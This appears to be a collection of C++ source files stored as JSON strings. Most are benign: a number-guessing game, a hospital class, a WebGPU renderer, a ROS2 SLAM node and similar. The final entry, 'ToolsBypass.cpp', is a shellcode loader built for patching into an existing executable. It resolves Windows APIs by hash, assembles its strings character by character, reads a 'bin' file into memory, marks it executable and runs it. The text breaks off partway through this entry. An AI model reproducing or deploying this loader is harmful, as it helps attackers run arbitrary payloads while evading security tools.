std::runtime_error(\"bad case in get_overlap\\n\");\n    return OverlapStatus::NO_OVERLAP;\n  }\n}\n\n/* ==================================================*/\n/* === INTERNALS: DO NOT MODIFY BELOW THIS LINE ===  */\n/* ==================================================*/\n\n// Sort shards in ascending order, by the lower bound.\nvoid sort_shards(std::vector<Shard>& shards) {\n  return std::sort(\n      shards.begin(), shards.end(),\n      [](const Shard& a, const Shard& b) { return a.lower < b.lower; });\n}\n\nbool is_valid(const std::string& s) {\n  for (auto&& c : s) {\n    if (std::find(VALID_CHARS.cbegin(), VALID_CHARS.cend(), std::toupper(c)) ==\n        VALID_CHARS.cend())\n      return false;\n  }\n  return true;\n}\n\nstd::string bucket_to_str(size_t bucket, size_t granularity) {\n  // Get the bucket's indices at each granularity within VALID_CHARS to\n  // construct the string\n  std::array<size_t, MAX_GRANULARITY> indices{};\n  size_t n_left = bucket;\n\n  // Use reverse order through GRANULARITY_OPTS, as we want to find the largest\n  // bucket at the current index before moving onto the next one.\n  //\n  // For example, with bucket = 1650, granularity = 3,\n  // we would iterate from GRANULARITY_OPTS[2 -> 0], or { 1296, 36, 1 }.\n  // The 1650th bucket would have indices { 1, 9, 30 }.\n  // - At index 0, we have 1650 / 1296 = 1, with 354 left.\n  // - At index 1, we have 354 / 36 = 9, with 30 left.\n  // - At index 2, we have 30 / 1 = 30.\n  for (size_t i = 0; i < granularity; i++) {\n    size_t index = n_left / GRANULARITY_OPTS[granularity - i - 1];\n    indices[i] = index;\n    n_left = n_left % GRANULARITY_OPTS[granularity - i - 1];\n  }\n\n  // now, construct res from given indices\n  // continuing with the example, given indices {1, 9, 30}, res = \"19U\"\n  std::string res(granularity, '\\0');\n  for (size_t i = 0; i < granularity; i++) {\n    res[i] = VALID_CHARS[indices[i]];\n  }\n  return res;\n}\n\nsize_t str_to_bucket(const std::string& s) {\n  /*\n  First, calculate the granularity of s.\n  This tells us the number of keys in our keyspace.\n  We divide these keys among 36 buckets -- that way, eac",
    "include <iostream>\r\n#include <cstdlib> // for rand() and srand()\r\n#include <ctime>   // for time()\r\n\r\nint main() {\r\n    // Initialize random seed\r\n    std::srand(static_cast<unsigned int>(std::time(nullptr)));\r\n\r\n    // Generate a random number between 1 and 100\r\n    int randomNumber = std::rand() % 100 + 1;\r\n    int guess = 0;\r\n\r\n    std::cout << \"I have generated a random number between 1 and 100.\" << std::endl;\r\n    std::cout << \"Can you guess what it is?\" << std::endl;\r\n\r\n    // Loop until the user guesses the correct number\r\n    while (guess != randomNumber) {\r\n        std::cout << \"Enter your guess: \";\r\n        std::cin >> guess;\r\n\r\n        if (guess > randomNumber) {\r\n            std::cout << \"Too high! Try again.\" << std::endl;\r\n        } else if (guess < randomNumber) {\r\n            std::cout << \"Too low! Try again.\" << std::endl;\r\n        } else {\r\n            std::cout << \"Congratulations! You guessed the correct number: \" << randomNumber << std::endl;\r\n        }\r\n    }\r\n\r\n    return 0;\r\n}\r\n",
    "#include <iostream>\n#include <fstream>\n#include <cstdlib>\n#include <ctime>\n\nstd::string generateRandomWord(int length) {\n    const std::string charSet = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\";\n    std::string randomWord;\n    for (int i = 0; i < length; ++i) {\n        randomWord += charSet[rand() % charSet.size()];\n    }\n    return randomWord;\n}\n\nvoid generateAndSaveWords(const std::string& filename, int wordLength, int numberOfWords) {\n    std::ofstream outFile(filename);\n    if (!outFile.is_open()) {\n        std::cerr << \"Error opening file!\" << std::endl;\n        return;\n    }\n\n    for (int i = 0; i < numberOfWords; ++i) {\n        outFile << generateRandomWord(wordLength) << std::endl;\n    }\n\n    outFile.close();\n}\n\nint main() {\n    srand(static_cast<unsigned>(time(0))); // Seed the random number generator\n\n    int wordLength;\n    int numberOfWords;\n    std::string filename;\n\n    std::cout << \"Enter the length of each word: \";\n    std::cin >> wordLength;\n\n    std::cout << \"Enter the number of words to generate: \";\n    std::cin >> numberOfWords;\n\n    std::cout << \"Enter the filename to save the words: \";\n    std::cin >> filename;\n\n    generateAndSaveWords(filename, wordLength, numberOfWords);\n\n    std::cout << \"Words have been generated and saved to \" << filename << std::endl;\n\n    return 0;\n}\n\n",
    "#include \"illness.h\"\n#include \"patient.h\"\n#include \"hcp.h\"\n#include \"hospital.h\"\n#include<iostream>\n#include<string>\n#include<memory>\n#include<stdexcept>\n#include<set>\n#include<map>\n#include<vector>\n\nHospital::Hospital(std::string name) : name(name) {\n    if (name.empty())\n        throw std::runtime_error(\"Empty name\");\n}\n\nbool Hospital::sign_hcp(std::shared_ptr<Health_Care_Provider> m) {\n    if (hcps.find(m->get_name()) != hcps.end())\n        return false;\n    hcps[m->get_name()] = m;\n    return true;\n}\n\nbool Hospital::admit_patient(std::shared_ptr<Patient> m) {\n    if (patients.find(m->get_name()) == patients.end() || patients[m->get_name()].expired()) {\n        patients[m->get_name()] = m;\n        return true;\n    }\n    return false;\n}\n\nbool Hospital::dismiss_hcp(std::string n) {\n    if (hcps.erase(n) > 0) {\n        return true;\n    }\n    return false;\n}\n\nstd::shared_ptr<Health_Care_Provider> Hospital::get_hcp(std::string n) const {\n    if (hcps.find(n) == hcps.end())\n        throw std::runtime_error(\"No HCP with such name\");\n    return hcps.at(n);\n}\n\nstd::shared_ptr<Patient> Hospital::get_patient(std::string n) const {\n    if (patients.find(n) == patients.end() || patients.at(n).expired())\n        throw std::runtime_error(\"No Patient with such name\");\n    return patients.at(n).lock();\n}\n\nbool Hospital::dismiss_patient(std::string n) {\n    auto it = patients.find(n);\n    bool n_exp{false};\n    if (it != patients.end()) {\n        if (!it->second.expired())\n            n_exp = true;\n        patients.erase(it);\n        if (n_exp)\n            return true;\n    }\n    return false;\n}\n\nstd::ostream& operator<<(std::ostream& o, const Hospital& p) {\n    o << \"[\" << p.name << \", hcps {\";\n    bool first{true};\n    for (const auto& hcp : p.hcps) {\n        if (first){\n            o << *(hcp.second);\n            first = false;\n        }\n        else {\n            o << \", \" << *(hcp.second);\n        }\n    }\n    o << \"}, patients {\";\n    first = true;\n    for (const auto& patient : p.patients) {\n        if (!patient.second.expired()) {\n            if (first){\n                o << *(patient.second.lock());\n                first = false;\n            }\n            else {\n                o << \", \" << *(patient.second.lock());\n            }\n        }\n    }\n    o << \"}]\";\n    return o;\n}",
    "#include \"Application.h\"\n#include \"webgpu-utils.h\"\n#include \"createFvertices.h\"\n\n#include <dawn/webgpu.h>\n#ifdef WEBGPU_BACKEND_WGPU\n#  include <webgpu/wgpu.h>\n#endif // WEBGPU_BACKEND_WGPU\n\n#include <GLFW/glfw3.h>\n#include <glfw3webgpu.h>\n\n#ifdef __EMSCRIPTEN__\n#  include <emscripten.h>\n#endif // __EMSCRIPTEN__\n\n#include <iostream>\n#include <cassert>\n#include <vector>\n\n#include <fstream>\n#include <sstream>\n#include <stdexcept>\n\n// Function to print GLFW errors\nvoid glfwErrorCallback(int error, const char* description) {\n    std::cerr << \"GLFW Error (\" << error << \"): \" << description << std::endl;\n}\n\n// Callback functions\nvoid Application::keyCallback(GLFWwindow* window, int key, int scancode, int action, int mods) {\n    if (action == GLFW_PRESS) {\n        std::cout << \"Key Pressed: \" << key << std::endl;\n    } else if (action == GLFW_RELEASE) {\n        std::cout << \"Key Released: \" << key << std::endl;\n    }\n}\n\nvoid Application::mouseButtonCallback(GLFWwindow* window, int button, int action, int mods) {\n    if (action == GLFW_PRESS) {\n        std::cout << \"Mouse Button Pressed: \" << button << std::endl;\n    } else if (action == GLFW_RELEASE) {\n        std::cout << \"Mouse Button Released: \" << button << std::endl;\n    }\n}\n\nvoid Application::cursorPosCallback(GLFWwindow* window, double xpos, double ypos) {\n    std::cout << \"Mouse Position: (\" << xpos << \", \" << ypos << \")\" << std::endl;\n}\n\nbool Application::Initialize() {\n    depth = 4;\n    asset_name = \"monsterfrog\";\n\n    createFVertices(asset_name, depth);\n\n    // Set GLFW error callback\n    glfwSetErrorCallback(glfwErrorCallback);\n\n    // Initialize GLFW\n    if (!glfwInit()) {\n        std::cerr << \"Failed to initialize GLFW\" << std::endl;\n        return false;\n    }\n\n    glfwWindowHint(GLFW_CLIENT_API, GLFW_NO_API);\n    glfwWindowHint(GLFW_RESIZABLE, GLFW_TRUE); // or GLFW_FALSE\n    window = glfwCreateWindow(1280, 720, \"Learn WebGPU\", nullptr, nullptr);\n    if (!window) {\n        std::cerr << \"Failed to create GLFW window\" << std::endl;\n        glfwTerminate();\n        return false;\n    }\n\n    glfwSetKeyCallback(window, keyCallback);\n    glfwSetMouseButtonCallback(window, mouseButtonCallback);\n    glfwSetCursorPosCallback(window, cursorPosCallback);\n\n    WGPUInstance instance = wgpuCreateInstance(nullptr);\n\n    std::cout << \"Requesting adapter...\" << std::endl;\n    surface = glfwGetWGPUSurface(instance, window);\n    WGPURequestAdapterOptions adapterOpts = {};\n    adapterOpts.nextInChain = nullptr;\n    adapterOpts.compatibleSurface = surface;\n    WGPUAdapter adapter = requestAdapterSync(instance, &adapterOpts);\n    std::cout << \"Got adapter: \" << adapter << std::endl;\n\n    wgpuInstanceRelease(instance);\n\n    std::cout << \"Requesting device...\" << std::endl;\n    WGPUDeviceDescriptor deviceDesc = {};\n    deviceDesc.nextInChain = nullptr;\n    deviceDesc.label = \"My Device\";\n    deviceDesc.requiredFeatureCount = 0;\n    deviceDesc.requiredLimits = nullptr;\n    deviceDesc.defaultQueue.nextInChain = nullptr;\n    deviceDesc.defaultQueue.label = \"The default queue\";\n    deviceDesc.deviceLostCallback = [](WGPUDeviceLostReason reason, char const* message, void* /* pUserData */) {\n        std::cout << \"Device lost: reason \" << reason;\n        if (message) std::cout << \" (\" << message << \")\";\n        std::cout << std::endl;\n    };\n    device = requestDeviceSync(adapter, &deviceDesc);\n    std::cout << \"Got device: \" << device << std::endl;\n\n    auto onDeviceError = [](WGPUErrorType type, char const* message, void* /* pUserData */) {\n        std::cout << \"Uncaptured device error: type \" << type;\n        if (message) std::cout << \" (\" << message << \")\";\n        std::cout << std::endl;\n    };\n    wgpuDeviceSetUncapturedErrorCallback(device, onDeviceError, nullptr /* pUserData */);\n\n    queue = wgpuDeviceGetQueue(device);\n\n    // Configure the surface\n    WGPUSurfaceConfiguration config = {};\n    config.nextInChain = nullptr;\n    config.width = 1280;\n    config.height = 720;\n    config.usage = WGPUTextureUsage_RenderAttachment;\n    surfaceFormat = wgpuSurfaceGetPreferredFormat(surface, adapter);\n    config.format = surfaceFormat;\n    config.viewFormatCount = 0;\n    config.viewFormats = nullptr;\n    config.device = device;\n    config.presentMode = WGPUPresentMode_Fifo;\n    config.alphaMode = WGPUCompositeAlphaMode_Auto;\n\n    wgpuSurfaceConfigure(surface, &config);\n\n    // Release the adapter only after it has been fully utilized\n    wgpuAdapterRelease(adapter);\n\n    InitializePipeline();\n    InitializeBuffers();\n    return true;\n}\n\nvoid Application::Terminate() {\n//    wgpuBufferRelease(pointBuffer);\n//    wgpuBufferRelease(indexBuffer);\n//    wgpuRenderPipelineRelease(pipeline);\n//    wgpuSurfaceUnconfigure(surface);\n//    wgpuQueueRelease(queue);\n//    wgpuSurfaceRelease(surface);\n//    wgpuDeviceRelease(device);\n//    glfwDestroyWindow(window);\n//    glfwTerminate();\n\n    for (auto& buffer : buffers.connectivity) {\n        wgpuBufferRelease(buffer);\n    }\n    for (auto& ",
    "/*\r\n\tOS independent generic button model.\r\n  Based on the Observer pattern the button model notify the listener object.\r\n  This implementation has only one listener.\r\n  https://en.wikipedia.org/wiki/Observer_pattern\r\n*/\r\n\r\n#include \"ButtonModel.h\"\r\n\r\nButtonListener::ButtonListener(ButtonModel &model)\r\n  : _model(model)\r\n{\r\n  _model.addlistener(this);\r\n}\r\n\r\nvoid ButtonModel::notify(ButtonListener::Events theevent) {\r\n  if (_listener) _listener->EventHandler(theevent);\r\n}\r\n\r\n\r\nvoid ButtonModel::enable(bool astate) {\r\n  _click_count = 0;\r\n  _prev_state = astate;\r\n  _pressed_triggered = false;\r\n  _longclick_detected = false;\r\n  _enabled = true;\r\n}\r\n\r\nvoid ButtonModel::disable() {\r\n  _enabled = false;\r\n}\r\n\r\nvoid ButtonModel::process(bool astate, unsigned long now) {\r\n  if ( !_enabled) return;\r\n\r\n  // is button pressed?\r\n  if (_prev_state == true && astate == false) {\r\n    _down_ms = now;\r\n    _pressed_triggered = false;\r\n    _click_ms = _down_ms;\r\n    _click_count++;\r\n\r\n    // is the button released?\r\n  } else if (_prev_state == false && astate == true) {\r\n    unsigned int down_time_ms = now - _down_ms;\r\n    // is it beyond debounce time?\r\n    if (down_time_ms >= _debounce_time_ms) {\r\n      // was it a longclick? (preceeds single / double / triple clicks)\r\n      if (down_time_ms >= _longclick_time_ms) {\r\n        _longclick_detected = true;\r\n      }\r\n      // trigger release\r\n      notify(ButtonListener::Events::Changed);\r\n      notify(ButtonListener::Events::Released);\r\n    }\r\n\r\n    // trigger pressed event (after debounce has passed)\r\n  } else if (astate == false && !_pressed_triggered && (now - _down_ms >= _debounce_time_ms)) {\r\n    _pressed_triggered = true;\r\n    // trigger pressed\r\n    notify(ButtonListener::Events::Changed);\r\n    notify(ButtonListener::Events::Pressed);\r\n\r\n    // is the button pressed and the time has passed for multiple clicks?\r\n  } else if (astate == true && _click_ms && now - _click_ms > _doubleclick_time_ms) {\r\n    // was there a longclick?\r\n    if (_longclick_detected) {\r\n      // was it part of a combination?\r\n      if (_click_count == 1) {\r\n        notify(ButtonListener::Events::LongClick);\r\n      }\r\n      _longclick_detected = false;\r\n      // determine the number of single clicks\r\n    } else if (_click_count > 0) {\r\n      switch (_click_count) {\r\n        case 1:\r\n          notify(ButtonListener::Events::Click);\r\n          break;\r\n        case 2:\r\n          notify(ButtonListener::Events::DoubleClick);\r\n          break;\r\n        case 3:\r\n          notify(ButtonListener::Events::TripleClick);\r\n          break;\r\n      }\r\n    }\r\n    _click_count = 0;\r\n    _click_ms = 0;\r\n  }\r\n  _prev_state = astate;\r\n}\r\n",
    "#include \"../include/UserInterface.h\"\n#include <iostream>\n\nUserInterface::UserInterface(AudioProcessor& processor) : audioProcessor(processor), window(nullptr) {}\n\nUserInterface::~UserInterface() {\n    ImGui_ImplOpenGL3_Shutdown();\n    ImGui_ImplGlfw_Shutdown();\n    ImGui::DestroyContext();\n\n    if (window) {\n        glfwDestroyWindow(window);\n    }\n    glfwTerminate();\n}\n\nbool UserInterface::initialize() {\n    if (!glfwInit()) {\n        std::cerr << \"Failed to initialize GLFW\" << std::endl;\n        return false;\n    }\n\n    window = glfwCreateWindow(800, 600, \"Audio Processor UI\", NULL, NULL);\n    if (!window) {\n        std::cerr << \"Failed to create GLFW window\" << std::endl;\n        glfwTerminate();\n        return false;\n    }\n\n    glfwMakeContextCurrent(window);\n    glfwSwapInterval(1); // Enable vsync\n\n    IMGUI_CHECKVERSION();\n    ImGui::CreateContext();\n    ImGuiIO& io = ImGui::GetIO(); (void)io;\n\n    ImGui::StyleColorsDark();\n\n    ImGui_ImplGlfw_InitForOpenGL(window, true);\n    ImGui_ImplOpenGL3_Init(\"#version 130\");\n\n    return true;\n}\n\nvoid UserInterface::render() {\n    glfwPollEvents();\n\n    ImGui_ImplOpenGL3_NewFrame();\n    ImGui_ImplGlfw_NewFrame();\n    ImGui::NewFrame();\n\n    ImGui::Begin(\"Audio Processor Controls\");\n    \n    if (ImGui::CollapsingHeader(\"Equalizer\")) {\n        renderEQControls();\n    }\n    \n    if (ImGui::CollapsingHeader(\"Reverb\")) {\n        renderReverbControls();\n    }\n    \n    if (ImGui::CollapsingHeader(\"Compressor\")) {\n        renderCompressorControls();\n    }\n\n    ImGui::End();\n\n    ImGui::Render();\n    int display_w, display_h;\n    glfwGetFramebufferSize(window, &display_w, &display_h);\n    glViewport(0, 0, display_w, display_h);\n    glClearColor(0.45f, 0.55f, 0.60f, 1.00f);\n    glClear(GL_COLOR_BUFFER_BIT);\n    ImGui_ImplOpenGL3_RenderDrawData(ImGui::GetDrawData());\n\n    glfwSwapBuffers(window);\n}\n\nbool UserInterface::shouldClose() {\n    return glfwWindowShouldClose(window);\n}\n\nvoid UserInterface::renderEQControls() {\n    if (ImGui::SliderFloat(\"Low Frequency\", &lowFreq, 20.0f, 1000.0f, \"%.1f Hz\")) {\n        audioProcessor.setLowFrequency(lowFreq);\n    }\n    if (ImGui::SliderFloat(\"Mid Frequency\", &midFreq, 200.0f, 5000.0f, \"%.1f Hz\")) {\n        audioProcessor.setMidFrequency(midFreq);\n    }\n    if (ImGui::SliderFloat(\"High Frequency\", &highFreq, 1000.0f, 20000.0f, \"%.1f Hz\")) {\n        audioProcessor.setHighFrequency(highFreq);\n    }\n    if (ImGui::SliderFloat(\"Low Gain\", &lowGain, -12.0f, 12.0f, \"%.1f dB\")) {\n        audioProcessor.setLowGain(lowGain);\n    }\n    if (ImGui::SliderFloat(\"Mid Gain\", &midGain, -12.0f, 12.0f, \"%.1f dB\")) {\n        audioProcessor.setMidGain(midGain);\n    }\n    if (ImGui::SliderFloat(\"High Gain\", &highGain, -12.0f, 12.0f, \"%.1f dB\")) {\n        audioProcessor.setHighGain(highGain);\n    }\n}\n\nvoid UserInterface::renderReverbControls() {\n    if (ImGui::SliderFloat(\"Room Size\", &reverbRoomSize, 0.0f, 1.0f)) {\n        audioProcessor.setReverbRoomSize(reverbRoomSize);\n    }\n    if (ImGui::SliderFloat(\"Damping\", &reverbDamping, 0.0f, 1.0f)) {\n        audioProcessor.setReverbDamping(reverbDamping);\n    }\n    if (ImGui::SliderFloat(\"Wet Level\", &reverbWetLevel, 0.0f, 1.0f)) {\n        audioProcessor.setReverbWetLevel(reverbWetLevel);\n    }\n    if (ImGui::SliderFloat(\"Dry Level\", &reverbDryLevel, 0.0f, 1.0f)) {\n        audioProcessor.setReverbDryLevel(reverbDryLevel);\n    }\n}\n\nvoid UserInterface::renderCompressorControls() {\n    if (ImGui::SliderFloat(\"Threshold\", &compressorThreshold, -60.0f, 0.0f, \"%.1f dB\")) {\n        audioProcessor.setCompressorThreshold(compressorThreshold);\n    }\n    if (ImGui::SliderFloat(\"Ratio\", &compressorRatio, 1.0f, 20.0f, \"%.1f:1\")) {\n        audioProcessor.setCompressorRatio(compressorRatio);\n    }\n    if (ImGui::SliderFloat(\"Attack\", &compressorAttack, 0.1f, 100.0f, \"%.1f ms\")) {\n        audioProcessor.setCompressorAttack(compressorAttack);\n    }\n    if (ImGui::SliderFloat(\"Release\", &compressorRelease, 10.0f, 1000.0f, \"%.1f ms\")) {\n        audioProcessor.setCompressorRelease(compressorRelease);\n    }\n}\n",
    "#include \"orb_slam.hpp\"\n\nusing namespace std::chrono_literals;\n\n/**\n *  @brief\n */\nOrbSlamRos2::OrbSlamRos2(): Node(\"orb_slam_ros2\"){\n    RCLCPP_INFO(this->get_logger(), \"Start orb_slam_ros2 \");\n\n    // pub & sub\n    str_publisher_ = this->create_publisher<std_msgs::msg::String>(\"/hello/hl\", 10);\n    str_subscriber_ = this->create_subscription<std_msgs::msg::String>(\"/i/heard\", 100, std::bind(&OrbSlamRos2::strSubCallback, this, std::placeholders::_1));\n    \n    // timer\n    timer_ = this->create_wall_timer(1000ms, std::bind(&OrbSlamRos2::timerCallback, this));\n\n    orb_slam_th_ = std::thread(&OrbSlamRos2::run, this);   \n}\n\n/**\n *  @brief\n */\nOrbSlamRos2::~OrbSlamRos2(){\n\n}\n\nvoid OrbSlamRos2::strSubCallback(std_msgs::msg::String str_msg){\n    RCLCPP_INFO(this->get_logger(), \"Call strSubCallback()\");\n}\n\n/**\n *  @brief\n */\nvoid OrbSlamRos2::timerCallback(){\n    // publisher test timer\n    auto msg = std_msgs::msg::String();\n    msg.data = \"Hello World!\";\n\n    str_publisher_->publish(msg);\n}\n\n/**\n *  @brief\n */\nvoid OrbSlamRos2::run(){\n   /* Change Image Path to run the code with offline mode */\n    std::string strImagePath = \"/home/nahyoun/Desktop/Data/MPA/HKL_Parkinglot/B2_SLAM\";\n\n    std::vector<std::string> vstrImageFilenames;\n    std::vector<double> vTimestamps;\n    bool bUseViewer = true;\n\n    loadImages(std::string(strImagePath), vstrImageFilenames, vTimestamps);\n\n    int nImages = vstrImageFilenames.size();\n\n    // Create SLAM system. It initializes all system threads and gets ready to process frames.\n    ORB_SLAM3::System SLAM(true);\n    float imageScale = SLAM.GetImageScale();\n\n    // Vector for tracking time statistics\n    std::vector<float> vTimesTrack;\n    vTimesTrack.resize(nImages);\n\n    std::cout << std::endl << \"-------\" << std::endl;\n    std::cout << \"Start processing sequence ...\" << std::endl;\n    std::cout << \"Images in the sequence: \" << nImages << std::endl << std::endl;\n\n    // Main loop\n    double t_resize = 0.f;\n    double t_track = 0.f;\n\n    cv::Mat im;\n\n    for(auto ni=0; ni<nImages; ni++)\n    {\n        // Read image from file\n        im = cv::imread(vstrImageFilenames[ni],cv::IMREAD_UNCHANGED); //,cv::IMREAD_UNCHANGED);\n        double tframe = vTimestamps[ni];\n\n        if(im.empty())\n        {\n            std::cerr << std::endl << \"Failed to load image at: \" << vstrImageFilenames[ni] << std::endl;\n            return;\n        }\n\n        if(imageScale != 1.f)\n        {\n            int width = im.cols * imageScale;\n            int height = im.rows * imageScale;\n            cv::resize(im, im, cv::Size(width, height));\n        }\n\n        std::chrono::steady_clock::time_point t1 = std::chrono::steady_clock::now();\n\n        // Pass the image to the SLAM system\n        SLAM.TrackMonocular(im,tframe,vector<ORB_SLAM3::IMU::Point>(), vstrImageFilenames[ni]);\n\n        std::chrono::steady_clock::time_point t2 = std::chrono::steady_clock::now();\n\n        double ttrack= std::chrono::duration_cast<std::chrono::duration<double> >(t2 - t1).count();\n\n        vTimesTrack[ni]=ttrack;\n\n        // Wait to load the next frame\n        double T=0;\n        if(ni<nImages-1)\n            T = vTimestamps[ni+1]-tframe;\n        else if(ni>0)\n            T = tframe-vTimestamps[ni-1];\n\n        if(ttrack<T)\n            usleep((T-ttrack)*1e6);\n    }\n\n    // Stop all threads\n    SLAM.Shutdown();\n\n    // Tracking time statistics\n    sort(vTimesTrack.begin(),vTimesTrack.end());\n    float totaltime = 0;\n    for(int ni=0; ni<nImages; ni++)\n    {\n        totaltime+=vTimesTrack[ni];\n    }\n    std::cout << \"-------\" << std::endl << std::endl;\n    std::cout << \"median tracking time: \" << vTimesTrack[nImages/2] << std::endl;\n    std::cout << \"mean tracking time: \" << totaltime/nImages << std::endl;\n\n    // Save camera trajectory\n    SLAM.SaveKeyFrameTrajectory(\"KeyFrameTrajectory.txt\");    \n}\n\n/**\n *  @brief\n */\nvoid OrbSlamRos2::loadImages(const std::string &strPathToSequence, std::vector<std::string> &vstrImageFilenames, std::vector<double> &vTimestamps)\n{\n    ifstream fTimes;\n    std::string strPathTimeFile = strPathToSequence + \"/times.txt\";\n    fTimes.open(strPathTimeFile.c_str());\n    while(!fTimes.eof())\n    {\n        std::string s;\n        getline(fTimes,s);\n        if(!s.empty())\n        {\n            stringstream ss;\n            ss << s;\n            double t;\n            ss >> t;\n            vTimestamps.push_back(t);\n        }\n    }\n\n    auto strPrefixLeft = strPathToSequence + \"/image/RGB/\";\n\n    const int nTimes = vTimestamps.size();\n    vstrImageFilenames.resize(nTimes);\n\n    for(int i=0; i<nTimes; i++)\n    {\n        stringstream ss;\n        ss << setfill('0') << setw(6) << i;\n        vstrImageFilenames[i] = strPrefixLeft + ss.str() + \".png\";\n    }\n}\n",
    "/*\n * \u6587\u4ef6\u540d\u79f0: ToolsBypass.cpp\n * \u4f5c\u8005: yinsel\n * \u521b\u5efa\u65e5\u671f: 2024.08.03\n * \u63cf\u8ff0: \u81ea\u5b9a\u4e49patch\u7684shellcode\n */\n\n#include<windows.h>\n#include<wininet.h>\n\n#include \"utils.hpp\"\n#include \"api.hpp\"\n\n#define EXPORT extern \"C\" __declspec(dllexport)\n\n#include<stdio.h>\n\ntypedef struct _FUNCTIONS {\n\t// Kernel32.dll\n\tLoadLibraryAFunc pLoadLibraryA;\n\tWinExecFunc pWinExec;\n\tGetFileAttributesAFunc pGetFileAttributesA;\n\tExitProcessFunc pExitProcess;\n\tCreateFileAFunc pCreateFileA;\n\tGetFileSizeFunc pGetFileSize;\n\tVirtualAllocFunc pVirtualAlloc;\n\tReadFileFunc pReadFile;\n\tVirtualProtectFunc pVirtualProtect;\n\tGetStdHandleFunc pGetStdHandle;\n\tWriteConsoleAFunc pWriteConsoleA;\n\tSleepFunc pSleep;\n\n\t// User32.dll\n\tMessageBoxAFunc pMessageBoxA;\n\tMessageBoxWFunc pMessageBoxW;\n}Functions, * PFunctions;\n\n\n// \u5b9a\u4e49\u7a0b\u5e8f\u5165\u53e3\n#pragma comment(linker,\"/entry:Main\")\n\n// RVA\nconstexpr auto InitAddr = 0x000309B0;\nconstexpr auto RunAddr = 0x0000695A0;\n\n/*\n\t\u8be5\u51fd\u6570\u8d1f\u8d23\u521d\u59cb\u5316\u9700\u8981\u7684\u51fd\u6570\u5730\u5740\n*/\n#pragma code_seg(\"Init\")\nEXPORT void Init(PFunctions API) {\n\t_DWORD dwNtdll = GetNtdllAddr();\n\t_DWORD dwKernel32 = GetKernel32Addr();\n\n\tAPI->pLoadLibraryA = (LoadLibraryAFunc)GetFuncAddrByHash(dwKernel32, LoadLibraryAHash);\n\tvolatile char szUser32[] = { 'U', 's', 'e', 'r', '3', '2', '.', 'd', 'l', 'l', '\\0' };\n\t_DWORD dwUser32 = (_DWORD)API->pLoadLibraryA((char*)szUser32);\n\n\tDWORD ntdllFunHashes[] = { 0x00 };\n\tDWORD kernel32FunHashes[] = {\n\t\tLoadLibraryAHash,GetFileAttributesAHash,ExitProcessHash,\n\t\tCreateFileAHash,GetFileSizeHash,VirtualAllocHash,ReadFileHash,\n\t\tVirtualProtectHash,GetStdHandleHash,WriteConsoleAHash,SleepHash };\n\tDWORD user32FunHashes[] = { MessageBoxAHash };\n\n\tFunction functions[] = {\n\t\t{ dwNtdll,ntdllFunHashes,sizeof(ntdllFunHashes) / sizeof(DWORD) },\n\t\t{ dwKernel32,kernel32FunHashes,sizeof(kernel32FunHashes) / sizeof(DWORD)},\n\t\t{ dwUser32,user32FunHashes,sizeof(user32FunHashes) / sizeof(DWORD) }\n\t};\n\n\tvoid** api = (void**)API;\n\tint offset = 0;\n\tfor (size_t i = 0; i < sizeof(functions) / sizeof(Function); i++) {\n\t\tconst Function func = functions[i];\n\t\tfor (DWORD j = 0; j < func.count; j++) {\n\t\t\tif (func.funcHashs[j] != 0x00) {\n\t\t\t\t*(api + offset) = (void*)GetFuncAddrByHash(func.dwDllBase, func.funcHashs[j]);\n\t\t\t}\n\t\t\telse {\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\toffset++;\n\t\t}\n\t}\n}\n\n/*\n\tshellcode\n\t\u52a0\u8f7dbin\u6587\u4ef6\u81f3\u5185\u5b58\u6267\u884c\n*/\n#pragma code_seg(\"Run\")\nEXPORT int Run(_DWORD dwExeBase) {\n\tFunctions API;\n\t// \u521d\u59cb\u5316\u51fd\u6570\u5730\u5740\n\t((void(*)(PFunctions))(dwExeBase + InitAddr))(&API);\n\tchar szbin[] = { 'b', 'i', 'n', '\\0' };\n\tvolatile char log[] = { '[', 'L', 'o', 'g', ']', ' ', 'b', 'i', 'n', ' ', 'n', 'o', 't', ' ', 'e', 'x', 'i', 's', 't', 's', '\\0' };\n\tvolatile char loding[] = { '[', 'L', 'o', 'g', ']', ' ', 'L', 'o', 'd', 'i', 'n', 'g', '.', '.', '.', '\\0' };\n\n\tHANDLE hConsole = API.pGetStdHandle(STD_OUTPUT_HANDLE);\n\n\tif (hConsole == NULL) {\n\t\tAPI.pExitProcess(-1);\n\t\treturn -6;\n\t}\n\n\t\n\t/*\n\t\t\u5224\u65ad\u6587\u4ef6\u662f\u5426\u5b58\u5728\n\t*/\n\tDWORD result = API.pGetFileAttributesA(szbin);\n\tif (result == INVALID_FILE_ATTRIBUTES) {\n\t\tAPI.pWriteConsoleA(hConsole, (char*)log, strlen((char*)log), NULL, NULL);\n\t\tAPI.pExitProcess(-1);\n\t\treturn -1;\n\t}\n\n\t/*\n\t\t\u8bfb\u53d6\u6587\u4ef6\u81f3\u5185\u5b58\n\t*/\n\tHANDLE hFile = API.pCreateFileA(szbin, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);\n\tif (hFile == INVALID_HANDLE_VALUE) {\n\t\treturn -2;\n\t}\n\tDWORD fileSize = API.pGetFileSize(hFile, NULL);\n\tif (fileSize <= 0) {\n\t\treturn -3;\n\t}\n\tBYTE* Buffer = (BYTE*)API.pVirtualAlloc(NULL, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n\tif (Buffer == NULL) {\n\t\treturn -4;\n\t}\n\tDWORD byteRead;\n\tif (!API.pReadFile(hFile, Buffer, fileSize, &byteRead, NULL) || byteRead <= 0) {\n\t\treturn -5;\n\t}\n\tDWORD old;\n\tif (!API.pVirtualProtect(Buffer, fileSize, PAGE_EXECUTE_READWRITE, &old)) {\n\t\treturn -6;\n\t}\n\n\tAPI.pWriteConsoleA(hConsole, (char*)loding, strlen((char*)loding), NULL, NULL);\n\n\tAPI.pSleep(1500);\n\n\t// \u8fd0\u884cshellcode\n\t((void(*)())Buffer)();\n\n}\n\n/*\n\t\u8d1f\u8d23\u8df3\u8f6c\n*/\n#pragma code_seg(\"Entry\")\nEXPORT void goto_shellcode() {\n\t_DWORD dwExeBase = GetExeBaseAddr();\n\tif (dwExeBase != NULL) {\n\t\tif (dwExeBase == 0x16464888) {\n\t\t\t_DWORD addr = ((_DWORD(*)(_DWORD))(dwExeBase + 0x4678))(dwExeBase);\n\t\t\t((void(*)(_DWORD))(addr))(dwExeBase);\n\t\t}\n\t\tif (dwExeBase != 0xff5546) {\n\t\t\t// 